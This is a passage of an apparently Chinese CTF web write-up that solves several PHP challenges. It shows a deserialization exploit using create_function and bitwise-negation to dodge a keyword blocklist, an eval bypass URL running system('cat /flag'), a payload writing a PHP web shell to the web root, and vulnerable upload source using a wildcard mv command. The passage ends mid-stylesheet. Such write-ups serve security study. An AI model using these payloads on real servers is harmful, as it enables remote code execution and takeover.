        <span class="token variable">$blocked_b</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'find'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filter'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'c'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'proc'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dir'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'alter'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'grep'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'o'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sort'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'h'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sy'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'array'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'touch'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$pattern_a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'preg_quote'</span><span class="token punctuation">,</span> <span class="token variable">$blocked_a</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
        <span class="token variable">$pattern_b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'preg_quote'</span><span class="token punctuation">,</span> <span class="token variable">$blocked_b</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern_a</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern_b</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>使用create_function<br>黑名单字符可以有取反绕过</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$b</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$sys</span> <span class="token operator">=</span> <span class="token operator">~</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span> 
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token operator">~</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">;</span>
<span class="token variable">$payload_code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&#125;$i=(~"'</span><span class="token operator">.</span><span class="token variable">$sys</span><span class="token operator">.</span><span class="token string single-quoted-string">'");$i(~"'</span><span class="token operator">.</span><span class="token variable">$cmd</span><span class="token operator">.</span><span class="token string single-quoted-string">'");/*'</span><span class="token punctuation">;</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"create_function"</span><span class="token punctuation">,</span> <span class="token variable">$payload_code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$serialized</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span>  <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[A-Za-z\(\)_;]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'师傅，你想拿flag？'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> </span></code></pre>

<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge.bluesharkinfo.com:24119?code&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(&#39;cat &#x2F;flag&#39;);</code></pre>


<h3 id="来签个到吧"><a href="#来签个到吧" class="headerlink" title="来签个到吧"></a>来签个到吧</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileLogger</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$logfile</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/notehub.log"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">logfile</span><span class="token operator">=</span><span class="token string single-quoted-string">'/var/www/html/a.php'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php system($_GET[1]);'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"blueshark:"</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre>

<h3 id="mv-upload"><a href="#mv-upload" class="headerlink" title="mv_upload"></a>mv_upload</h3><p>以为作者二倍让我做黑盒，后来给了提示，原来是我二倍</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251202180959.png" alt="image.png" loading="lazy"><br>访问<code>index.php~</code>拿到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$uploadDir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/tmp/upload/'</span><span class="token punctuation">;</span> <span class="token comment">// 临时目录</span>
<span class="token variable">$targetDir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/upload/'</span><span class="token punctuation">;</span> <span class="token comment">// 存储目录</span>

<span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phtml'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php3'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php7'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phps'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pht'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jsp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jspa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jspx'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jsw'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jsv'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jspf'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jtml'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'asp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'aspx'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ascx'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ashx'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asmx'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cer'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'aSp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'aSpx'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cEr'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pHp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'shtml'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'shtm'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'stm'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pl'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cgi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bat'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'py'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'scgi'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htaccess'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'htpasswd'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ini"</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$filesInTmp</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// 创建目标目录</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$targetDir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$targetDir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 上传临时目录</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$uploadedFiles</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$uploadedFiles</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$uploadedFiles</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$index</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$message</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"文件 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span> 上传失败。&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token variable">$tmpName</span> <span class="token operator">=</span> <span class="token variable">$uploadedFiles</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$index</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$message</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"文件名无效，跳过。&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token variable">$fileParts</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fileParts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileParts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$blacklist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$message</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"文件 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span> 因类型不安全（.<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$extension</span><span class="token punctuation">&#125;</span></span>）被拒绝。&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token variable">$destination</span> <span class="token operator">=</span> <span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">,</span> <span class="token variable">$destination</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$message</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"文件 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span> 已上传至 <span class="token interpolation"><span class="token variable">$uploadDir</span></span><span class="token interpolation"><span class="token variable">$filename</span></span> 。&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$message</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"文件 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span> 移动失败。&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 获取临时目录中的所有文件</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$filesInTmp</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 处理确认上传完毕（移动文件）</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'confirm_move'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$filesInTmp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$message</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"没有可移动的文件。&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$returnCode</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cd <span class="token interpolation"><span class="token variable">$uploadDir</span></span> ; mv * <span class="token interpolation"><span class="token variable">$targetDir</span></span> 2>&amp;1"</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">,</span> <span class="token variable">$returnCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$returnCode</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filesInTmp</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$message</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"已移动文件: <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$file</span><span class="token punctuation">&#125;</span></span> 至<span class="token interpolation"><span class="token variable">$targetDir</span></span><span class="token interpolation"><span class="token variable">$file</span></span>&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$message</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"移动文件失败: "</span> <span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">', '</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>多文件上传服务<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
        <span class="token selector">body</span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
        <span class="token selector">.container</span> <span class="token punctuation">&#123;</span> <span class="token property">max-width</span><span class="token punctuation">:</span> 800px<span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
        <span class="token selector">.alert</span> <span class="token punctuation">&#123;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> 10px 0<span class="token punctuation">;</span> <span class="token property">background</span><span class="token punctuation">:</span> #f8d7da<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span> #721c24<span class="token punctuation">;</span> <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #f5c6cb<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
        <span class="token selector">.success</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> #d4edda<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span> #155724<span class="token punctuation">;</span> <span class="token property">border-color</span><span class="token punctuation">:</span> #c3e6cb<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
        <span class="token selector">ul</span> <span class="token punctuation">&#123;</span> <span class="token property">list-style-type</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
